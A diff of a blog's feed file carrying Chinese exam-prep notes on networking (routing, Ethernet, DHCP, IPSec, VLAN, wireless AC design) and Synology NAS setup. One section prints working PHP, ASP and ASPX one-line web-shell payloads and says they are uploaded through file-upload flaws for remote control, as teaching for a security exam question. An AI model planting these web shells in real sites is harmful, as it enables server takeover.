@@ -80,18 +80,12 @@
   
   
   <entry>
-    <title></title>
+    <title>【软考】真题问题及复习笔记记录</title>
     <link href="/2023/05/15/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%9C%9F%E9%A2%98%E9%97%AE%E9%A2%98%E5%8F%8A%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%B0%E5%BD%95/"/>
     <url>/2023/05/15/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%9C%9F%E9%A2%98%E9%97%AE%E9%A2%98%E5%8F%8A%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%B0%E5%BD%95/</url>
     
     <content type="html"><![CDATA[<h2 id="———-复习笔记-———"><a href="#———-复习笔记-———" class="headerlink" title="———- 复习笔记 ———-"></a>———- 复习笔记 ———-</h2><h2 id="复习笔记-20230516-二"><a href="#复习笔记-20230516-二" class="headerlink" title="复习笔记 20230516(二)"></a>复习笔记 20230516(二)</h2><h3 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h3><p>RIP    udp 520<br>OSPF ip<br>ISIS   链路层<br>BGP   tcp 179</p><p>ospf和isis 链路状态协议</p><p>ospf使用hello报文维持邻居关系<br>isis也使用hello协议寻找毗邻节点</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/8ed4ac6bc9b0a887ee1fc045c72599f.jpg" alt="8ed4ac6bc9b0a887ee1fc045c72599f.jpg"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/39d7dadafe12fa58cfbbf92191df6a5.jpg" alt="8ed4ac6bc9b0a887ee1fc045c72599f.jpg"></p><h2 id="———-上午题-———"><a href="#———-上午题-———" class="headerlink" title="———- 上午题 ———-"></a>———- 上午题 ———-</h2><h2 id="2019年5月上午题-20230513-六-65-x2F-75"><a href="#2019年5月上午题-20230513-六-65-x2F-75" class="headerlink" title="2019年5月上午题  20230513(六)  65&#x2F;75"></a>2019年5月上午题  20230513(六)  65&#x2F;75</h2><h2 id="2019年11月上午题-20230515-一-59-x2F-75"><a href="#2019年11月上午题-20230515-一-59-x2F-75" class="headerlink" title="2019年11月上午题  20230515(一)  59&#x2F;75"></a>2019年11月上午题  20230515(一)  59&#x2F;75</h2><p>06<br>一般情况下属于职务作品，按国家著作权法规定，应属于单位所有。但如果与单位事先有特别约定，应遵从约定</p><p>07<br>软件开发者拥有署名权，其他著作权归属单位</p><p>08<br>在磁盘调度管理中，应先进行移臂调度，再进行旋转调度。 ？？？</p><p>12<br>传统以太网使用的是<u>曼彻斯特编码</u>，效率50%</p><p>13 14<br>HFC是将<u>光缆</u>敷设到小区，然后通过光电转换结点，利用有线电视CATV的总线式<u>同轴电缆</u>连接到用户，提供综合电信业务的技术。</p><p>15 千兆以太网<br>(1)1000 Base-T标准使用的是5类非屏蔽双绞线，双绞线长度可以达到100m。<br>(2)1000Base-X是基于光纤通道的物理层，使用的媒体有三种：<br>1000 Base-CX标准使用的是屏蔽双绞线，双绞线长度可以达到25m；<br>1000 Base-LX标准使用的是波长为1300nm的单模光纤，光纤长度可以达到3 000m；<br>1000 Base-SX标准使用的是波长为850nm的多模光纤，光纤长度可以达到300～550m。<br>其中前三项标准是IEEE 802.3z，而1000 Base-T的标准是IEEE 802.3ab。</p><p>16 CRC<br>在原始报文的后面添加若干个0 (生成多项式的最高次幂数 最终校验位的位数)</p><p>17 CSMA&#x2F;CD<br>在以太网中为了确保发送数据站点在传输时能检测到可能存在的冲突，数据帧的传输时延要不小于两倍的传播时延。<br>$$\displaystyle 传输时延 \geq 2\times\frac{任意两点间的最长距离}{信号传播速度}$$</p><p>19 20  HDLC<br>_HDLC_（High-Level Data Link Control，高级数据链路控制）<br>HDLC有三种不同类型的帧：信息帧(I帧)、监控帧(S帧)和无编号帧(U帧)。<br>信息帧用于传送用户数据、通常简称Ｉ帧。<br>监控帧用来差错控制和流量控制，<br>无编号帧用于提供对链路的建立、拆除以及多种控制功能。</p><p>21<br>发送方的拥塞窗口cwnd</p><p>26<br>OSPF报文封装在IP包中，协议号89<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230515200249.png" width="50%" height="50%"><br>29<br>1、我向浏览器中输入网址后，浏览器会效验网址的合法性，如果网址不合法，会传给默认的搜索引擎。<br>如果网址合法并通过验证，浏览器会，得到协议(http或https)，域名，资源页面(比如首面等)<br>2、DNS查询<br>浏览器会先检查域名信息是否在缓存中。<br>再检查域名是否在本地的Hosts文件中。<br>如果还不在，那么浏览器会向DNS服务器发送一个查询请求，获得目标服务器的IP地址。<br>3、TCP封包及传输<br>4、建立TCP连接后发起HTTP请求                             ？？？？<br>5、服务器接收请求并相应</p><p>33<br>关闭防火墙的方法为：</p><ol><li>永久性生效<br>开启：chkconfig iptables on<br>关闭：chkconfig iptables off</li><li>即时生效，重启后失效<br>开启：service iptables start<br>关闭：service iptables stop</li></ol><p>34<br>IIS（Internet Information Server，互联网信息服务）是一种Web（网页）服务组件</p><ul><li>DHCP服务器</li><li>DNS 服务器</li><li>传真服务器</li><li>Web服务器(IIS)<br>- Web服务器    网页浏览<br>- FTP服务器     文件传输<br>- NNTP服务器  新闻服务<br>- SMTP服务器   邮件发送</li></ul><p>36<br>DHCP服务可以服务于一个网段，也可以通过DHCP中继服务多个子网，在一个网段中可以配置多台DHCP服务器。<br>客户端要使用DHCP服务不需指定DHCP服务器地址，是通过广播方式寻找</p><p>41<br>公开密钥加密，也叫非对称加密，加密用到两个密钥，其中公开的是公钥，未公开的是私钥，一个用来加密，另一个用来解密。常见的非对称加密算法有RSA、ElGamal、DSA、ECC（椭圆曲线加密算法背包算法）等。<br>对称加密只用一个密钥，既做加密又做解密。常见的对称加密算法有：DES、AES、3DES、Blowfish等。</p><p>58<br>通常情况下，信息插座的安装位置距离地面的高度为( )cm  30-50<br>一般30cm，可以回忆下家里网线口高度是多少</p><p>61<br>选根网桥那个题，有歧义</p><p>62<br>RIPv1  RIPv2 有类不携带子网掩码 无类携带子网掩码 不支持VLSM、CIDR 支持VLSM、CIDR 没有认证功能 提供明文和MD5认证 广播更新 组播更新(广播也支持) 周期性更新30s 采用触发更新</p><p>66<br>固态硬盘没有IDE接口的，常见的有：SATA、PCIe和M.2。</p><h2 id="2022年5月上午题"><a href="#2022年5月上午题" class="headerlink" title="2022年5月上午题"></a>2022年5月上午题</h2><h2 id="———-下午题-———"><a href="#———-下午题-———" class="headerlink" title="———- 下午题 ———-"></a>———- 下午题 ———-</h2><h2 id="2019年11月下午题-20230516-二"><a href="#2019年11月下午题-20230516-二" class="headerlink" title="2019年11月下午题  20230516(二)"></a>2019年11月下午题  20230516(二)</h2><h3 id="第1题-ip地址相关-14-x2F-20"><a href="#第1题-ip地址相关-14-x2F-20" class="headerlink" title="第1题 ip地址相关 14&#x2F;20"></a>第1题 ip地址相关 14&#x2F;20</h3><h3 id="第2题"><a href="#第2题" class="headerlink" title="第2题"></a>第2题</h3><p>实现无线网络统一管理和漫游的设备，是无线控制器 AC<br>实现用户登录认证的设备是无线认证系统（可能是软件或硬件）<br>实现无线AP接入和供电的设备是POE交换机<br>实现高密度优化后接入的设备为高密吸顶式AP<br>看到X86线盒，就是面板上AP<br>其他设备：防火墙、IDS&#x2F;IPS、WAF、数据库审计、FC、交换机</p><p>实现网络隔离技术的技术有VLAN和ACL，如果是ACL，一版会说访问控制<br>实现审计和控制，阻止并记录非法访问，即<u>上网行为管理</u>设备</p><p>存储网络包含IP-SAN和FC-SAN。如果是FC-SAN，服务器一版会配置两块网卡，一张连接FC，一张连接以太网。<br>FC fiber channel 光纤通道</p><h2 id="2020年11月下午题-20230520-六"><a href="#2020年11月下午题-20230520-六" class="headerlink" title="2020年11月下午题   20230520(六)"></a>2020年11月下午题   20230520(六)</h2><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>1.组播报文对无线网络空口的影响主要有(14) ，随着业务数据转发的方式不同, 组播报文的抑制分别 在 (15)、(16) 配置。<br>(14)无线空口拥塞 (15)直连 AP 的交换机接口 (16) AC 的流量模板下 </p><p>组播报文在 无线空口没有 ACK 机制保障，为了纯组播报文能够稳定发送，通常对组播进行限速，或叫组播报文抑 制。直接转发时，会在 AP 直连交换机接口上配置，隧道转发时，在 AC 的流量模板下配置组播报文抑 制。</p><p>2.该网络 AP 部署在每一间宿舍的原因是（17）<br>(17)信号穿墙会有较大衰减，导致宿舍内信号差，故直接将 AP 部署在每个房间。</p><h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><h4 id="1-网络故障"><a href="#1-网络故障" class="headerlink" title="1 网络故障"></a>1 网络故障</h4><p>ping 127.0.0.1 不通，表示无法访问自己的环回地址，一般都是网卡驱动没有正确安装或 网卡 TCP&#x2F;IP 协议故障。<br>能登录互联网即时聊天软件，但无法打开网页，是域名解析的问题，选择 DNS 配置错误。</p><h4 id="2-一句话木马"><a href="#2-一句话木马" class="headerlink" title="2 一句话木马"></a>2 一句话木马</h4><p>先来看看最简单的一句话木马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure><p>【基本原理】利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。</p><p>常见的一句话木马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">php的一句话木马： &lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);?&gt;<br>asp的一句话是：   &lt;%<span class="hljs-built_in">eval</span> request (<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="hljs-built_in">eval</span>(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure><h4 id="3-攻击措施"><a href="#3-攻击措施" class="headerlink" title="3 攻击措施"></a>3 攻击措施</h4><p>针对上述攻击，应该采取 （6） 等措施进行防范。<br>部署防病毒网关或防垃圾邮件系统，启动应用层病毒过滤</p><h4 id="4-SAN"><a href="#4-SAN" class="headerlink" title="4 SAN"></a>4 SAN</h4><p>存储区域网络(Storage Area Network,简称 SAN)可分为（7）、（8）两种， 从部署成本和传输效率两个方面比 较这两种 SAN，比较结果为（9）。<br>（7）FC-SAN （8）IP-SAN （9）FC-SAN 部署成本高，传输效率较高</p><h4 id="5-raid2-0"><a href="#5-raid2-0" class="headerlink" title="5 raid2.0"></a>5 raid2.0</h4><p>raid2.0技术的优势<br>1、自动负载均衡，降低了存储系统整体故障率<br>2、快速精简重构，降低了双盘失效率和数据丢失的风险<br>3、故障自检自愈，保证了系统可靠性<br>4、虚拟池化设计，降低存储规划管理难度</p><h3 id="问题3-IPSec-VPN"><a href="#问题3-IPSec-VPN" class="headerlink" title="问题3 IPSec VPN"></a>问题3 IPSec VPN</h3><p>校本部与分校之间搭建了 IPSec VPN。IPSec 的功能可以划分为认证头 AH、封装安全负 荷 ESP 以及密钥交换 IKE。其中用于数据完整性认证和数据源认证的是（1）<br>AH 用于完整性和数据源认证，ESP 用于加密。</p><h3 id="问题4-vlan"><a href="#问题4-vlan" class="headerlink" title="问题4 vlan"></a>问题4 vlan</h3><p>划分 VLAN 的方式有：基于接口、基于 MAC 地址、基于子网、基于协议、基于策略</p><h2 id="2021年5月下午题-20230522-一"><a href="#2021年5月下午题-20230522-一" class="headerlink" title="2021年5月下午题   20230522(一)"></a>2021年5月下午题   20230522(一)</h2><h3 id="问题1-1"><a href="#问题1-1" class="headerlink" title="问题1"></a>问题1</h3><p>VRRP技术实现<u>网关冗余</u>功能，两个交换机之间的线称为<u>心跳线</u>，作用是<u>检测VRRP组的状态，出现故障及时切换</u></p><h3 id="问题2-1"><a href="#问题2-1" class="headerlink" title="问题2"></a>问题2</h3><p>保障数据安全可以使用VPN隧道，并进行加密传输，常用的是IPSec协议配合ESP进行加密。<br>出口带宽有限，可以增量备份，每次只备份增加的内容，能有效减少备份容量，提升备份速度。</p><h3 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h3><p>802.1x 主要在接入交换机上配置，题目中提到由接入交换机 S1 拦截用户流量，则是 802.1x。<br>如果是 web 认证，由防火墙&#x2F;行为管理设备 &#x2F;认证网关等设备进行认证处理<br>如果是 PPPOE 认证，是由 BRAS&#x2F;BAS 设备进行处理<br>如果是短信认证，需要有短信猫&#x2F;短信网关。</p><p>学校和企业采用 802.1x 认证较多<br>家庭宽带&#x2F;中小型企业采用 PPPOE<br>商超、车站等公共场所一般采用 Web&#x2F;portal 或短信认证。</p><h3 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h3><p>POE 有两种方式：<br>第一种：8 根铜芯既传数据，同时进行供电，两者使用不同频率；<br>第二种：使用 1236 进行数据传输，4578 进行供电，其中 45 位正极，78 为负极。</p><h2 id="2021年11月下午题-20230523-二"><a href="#2021年11月下午题-20230523-二" class="headerlink" title="2021年11月下午题   20230523(二)"></a>2021年11月下午题   20230523(二)</h2><h3 id="问题1-2"><a href="#问题1-2" class="headerlink" title="问题1"></a>问题1</h3><h4 id="1-AC部署方式-优缺点"><a href="#1-AC部署方式-优缺点" class="headerlink" title="1 AC部署方式 优缺点"></a>1 AC部署方式 优缺点</h4><p>相较于以旁路方式部署，将AC直连部署存在的问题是：<br>答案1 summer：设备故障会影响网络连通<br>答案2：存在单点故障、性能瓶颈<br>(老师)旁路部署，如果前期配置好，后面AC挂了，是不会影响网络的</p><p>直连部署的网络设 备通常会在网络的主干线路上，这种部署方式存在单点故障的问题，同时也可 能因为设备本身的性能达不到网络传输的要求，出现性能瓶颈。所以相当一部 分支持直连部署的设备都有设备故障时，网络数据能直通的功能。 </p><p>相较于部署在核心层，将AC部署在接入层存在的问题是：<br>答案1 summer：存在性能瓶颈<br>答案2 软考真题：不能很好的利用 AC 的 NAT 、 HDCP 功能。性能差，稳定性不好，其他区域的工作站访问距离远，效率低<br>(老师)一般核心交换机有万兆接口，且性能比接入交换机好很多</p><p>如果将 AC 部署在接入层设备上，往往由于接入层设备性能较差，稳定性不 好，也不会配置冗余的电源、线路等提升可靠性的条件。将 AC 部署在这种设备 上，可能会因为接入层设备本身的不可靠，导致无线网络瘫痪。另外，将 AC 接 在接入层设备上，也不能很好的利用 AC 本身的 NAT 和其他一些功能。并且，其 他区域的接入层工作站需要通过核心，再连接到接入层，再到 AC ，访问的路径 比较远，效率较低。</p><h4 id="2-认证"><a href="#2-认证" class="headerlink" title="2 认证"></a>2 认证</h4><p>PPPoE认证    ADSL 光纤<br>Portal            Web<br>IEEE 802.1x 企业级，需要安装客户端，安全性较高</p><p>“使用 web 页面进行认证后上网”可以知道这是一 种基于 webportal 的认证方式，这种方式最大的特点是不需要安装客户端，直 接使用浏览器访问网络之前，会强制定位到 web 认证页面。</p><h4 id="3-供电"><a href="#3-供电" class="headerlink" title="3 供电"></a>3 供电</h4><p>在网络规划中，对AP供电方式可以采用POE供电或DC电源适配器供电</p><h3 id="问题2-2"><a href="#问题2-2" class="headerlink" title="问题2"></a>问题2</h3><p>防火墙的工作模式：<br>透明模式：二层 不用配IP地址<br>路由模式：接口配ip地址<br>混合模式：有些接口配ip地址，有些接口不配</p><h3 id="问题4-1"><a href="#问题4-1" class="headerlink" title="问题4"></a>问题4</h3><p>新加入网络的主机需要通过 DHCP 方式获取 IP 地址，但是，在申请到合法的 IP 地址前，主机只能采用源 IP 地址 0.0.0.0 进行临时通信。</p><p>该主机发送的 DHCP 报文无法通过基于子网划分 VLAN 的方式加入任何 VLAN ，最终设备会给该报文会打上接口的缺省 VLAN ID(缺省情况下，接口的缺省 VLAN ID 为 1)。</p><h2 id="2022年5月下午题-20230525-四"><a href="#2022年5月下午题-20230525-四" class="headerlink" title="2022年5月下午题   20230525(四)"></a>2022年5月下午题   20230525(四)</h2><h3 id="BGP"><a href="#BGP" class="headerlink" title="BGP"></a>BGP</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230526003656.png" alt="image.png"></p><h3 id="rip-ospf"><a href="#rip-ospf" class="headerlink" title="rip ospf"></a>rip ospf</h3><p>从算法原理、适用范围、功能特性三个方面简述 RIP 和 OSPF 的区别。<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230526010359.png" alt="image.png"></p><h2 id="———-课件相关案例题-———"><a href="#———-课件相关案例题-———" class="headerlink" title="———- 课件相关案例题 ———-"></a>———- 课件相关案例题 ———-</h2><h2 id="常用的DDos攻击防范方法"><a href="#常用的DDos攻击防范方法" class="headerlink" title="常用的DDos攻击防范方法"></a>常用的DDos攻击防范方法</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230524082336.png" alt="image.png"></p><h2 id="MAC-flooding解决方案"><a href="#MAC-flooding解决方案" class="headerlink" title="MAC-flooding解决方案"></a>MAC-flooding解决方案</h2><p>接口和MAC静态绑定<br>限制接口MAC地址学习数量</p><h3 id="冗余"><a href="#冗余" class="headerlink" title="冗余"></a>冗余</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230525220504.png" alt="image.png"></p>]]></content>
     
-    
-    <categories>
-      
-      <category>net</category>
-      
-    </categories>
     
     
   </entry>
@@ -106,6 +100,12 @@
     <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>套件中心中没有docker，想要安装一个docker</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512220109.png" alt="image.png"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513000221.png" alt="image.png"></p><h2 id="添加第三方源"><a href="#添加第三方源" class="headerlink" title="添加第三方源"></a>添加第三方源</h2><p>修改配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512233229.png" alt="image.png"></p><p>套件中心—设置—套件来源—新增：名称随便取，位置把网址复制进去确认即可</p><p>DSM6.x矿神SPK套件源：<a href="https://imnks.com/go/aHR0cHM6Ly9zcGsuaW1ua3MuY29tLw">https://spk.imnks.com/</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235104.png" alt="image.png"></p><p>添加之后，可以看到左侧多了一个社群，然后在套件中心的社群搜索即可。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235200.png" alt="image.png"></p><p>点击“社群”，如果右侧没有东西的话，可以点击一下“刷新”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235234.png" alt="image.png"></p><p>搜索“docker”，直接安装</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235427.png" alt="image.png"></p><p>安装不上docker，为什么呢？显示下载docker失败</p><p>找<br>找<br>找</p><h3 id="尝试1：安装猫盘三合一修复"><a href="#尝试1：安装猫盘三合一修复" class="headerlink" title="尝试1：安装猫盘三合一修复"></a>尝试1：安装猫盘三合一修复</h3><p>安装完系统之后，发现指示灯不亮</p><p>不知道是否跟这个有关，安装下面套件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513001425.png" alt="image.png"></p><p>安装完之后，就可以看到猫盘的指示灯亮了</p><p>但是docker还是显示下载失败</p><h3 id="尝试2：切换用户"><a href="#尝试2：切换用户" class="headerlink" title="尝试2：切换用户"></a>尝试2：切换用户</h3><p>刚开始是用一个自定义用户登录的系统<br>切换到admin用户下安装</p><p>安装docker还是显示下载失败</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://post.smzdm.com/p/akmv452r/"># NAS 篇一：群晖DSM7.0 安装docker</a><br><a href="https://imnks.com/1780.html"># 矿神群晖SPK套件中心 上线啦！支持DSM6、DSM7</a></p>]]></content>
     
     
+    <categories>
+      
+      <category>nas</category>
+      
+    </categories>
+    
     
   </entry>
   
@@ -119,6 +119,12 @@
     <content type="html"><![CDATA[<p>第三方下载工具，配置麻烦</p>]]></content>
     
     
+    <categories>
+      
+      <category>nas</category>
+      
+    </categories>
+    
     
   </entry>
   
@@ -131,6 +137,12 @@
     
     <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213150.png" alt="image.png"></p><p>到“已安装”，点击“打开”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213239.png" alt="image.png"></p><p>会跳转到一个新的界面，显示如下：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213312.png" alt="image.png"></p><p>回到nas首页，点击“控制面板” “用户账号”</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213435.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213708.png" alt="image.png"></p><p>回到moments界面，重新刷新，就可以进来啦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213834.png" alt="image.png"></p><p>然后就可以创建文件夹，上传照片啦~</p>]]></content>
     
+    
+    <categories>
+      
+      <category>nas</category>
+      
+    </categories>
     
     
   </entry>
@@ -176,18 +188,12 @@
   
   
   <entry>
-    <title></title>
+    <title>【软考】环境搭建</title>
     <link href="/2023/05/09/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
     <url>/2023/05/09/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
     
     <content type="html"><![CDATA[<p>wireshark  2.6.6<br>ensp v1.3.00<br>oracle vm virtualbox 5.2.40</p><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><h3 id="virtualbox"><a href="#virtualbox" class="headerlink" title="virtualbox"></a>virtualbox</h3><p><a href="https://www.virtualbox.org/wiki/Download_Old_Builds_5_2">Download_Old_Builds_5_2 – Oracle VM VirtualBox</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230510002536.png" alt="image.png"></p><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p><a href="https://www.wireshark.org/download.html">Wireshark · Download</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230510002852.png" alt="image.png"></p><h3 id="ensp"><a href="#ensp" class="headerlink" title="ensp"></a>ensp</h3><h3 id="winpcap"><a href="#winpcap" class="headerlink" title="winpcap"></a>winpcap</h3><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><h3 id="报错信息-所有设备无法启动，错误代码40"><a href="#报错信息-所有设备无法启动，错误代码40" class="headerlink" title="报错信息 所有设备无法启动，错误代码40"></a>报错信息 <strong>所有设备无法启动，错误代码40</strong></h3><p>虚拟网卡的名称为“VirtualBox Host-Only Ethernet Adapter #2”，可尝试点击eNSP主界面“菜单-工具-注册设备”重新注册设备。</p><p>注意需要删除所有设备</p>]]></content>
     
-    
-    <categories>
-      
-      <category>net</category>
-      
-    </categories>
     
     
   </entry>
@@ -385,6 +391,12 @@
     <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/35c73430e00cc33ab5c7c9107a36c43.jpg" alt="35c73430e00cc33ab5c7c9107a36c43.jpg"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/4c87ad142cd052519e97a499726941b.jpg" alt="4c87ad142cd052519e97a499726941b.jpg"></p><p>连接电源和网线，将网线另一端接入路由器的lan口</p><h2 id="下载Synology-Assistant"><a href="#下载Synology-Assistant" class="headerlink" title="下载Synology Assistant"></a>下载Synology Assistant</h2><p>群晖助手Synology Assistant，下载安装：<a href="https://imnks.com/go/aHR0cHM6Ly9jbmRsLnN5bm9sb2d5LmNuL2Rvd25sb2FkL1V0aWxpdHkvQXNzaXN0YW50LzYuMi0yNDkyMi9XaW5kb3dzL3N5bm9sb2d5LWFzc2lzdGFudC02LjItMjQ5MjIuZXhl">Windows版本</a>，<a href="https://imnks.com/go/aHR0cHM6Ly9jbmRsLnN5bm9sb2d5LmNuL2Rvd25sb2FkL1V0aWxpdHkvQXNzaXN0YW50LzYuMi0yNDkyMi9NYWMvc3lub2xvZ3ktYXNzaXN0YW50LTYuMi0yNDkyMi5kbWc">Mac版本</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201931.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422185322.png" alt="image.png"></p><p>点击“同意” “确定”</p><p>进行系统初始化</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201246.png" alt="image.png"></p><p>点击设置，选择手动安装</p><p><a href="https://www.synology.cn/zh-cn/support/download/DS119j?version=6.2#system">下载中心 - DS119j | Synology 群晖科技</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230422201848.png" alt="image.png"></p><p>安装完之后，基本信息如下</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513001652.png" alt="image.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://imnks.com/597.html">https://imnks.com/597.html</a></p><p><a href="https://imnks.com/mp/">https://imnks.com/mp/</a>   </p>]]></content>
     
     
+    <categories>
+      
+      <category>nas</category>
+      
+    </categories>
+    
     
   </entry>
   
@@ -397,6 +409,12 @@
     
     <content type="html"><![CDATA[<p>白群晖</p>]]></content>
     
+    
+    <categories>
+      
+      <category>nas</category>
+      
+    </categories>
     
     
   </entry>
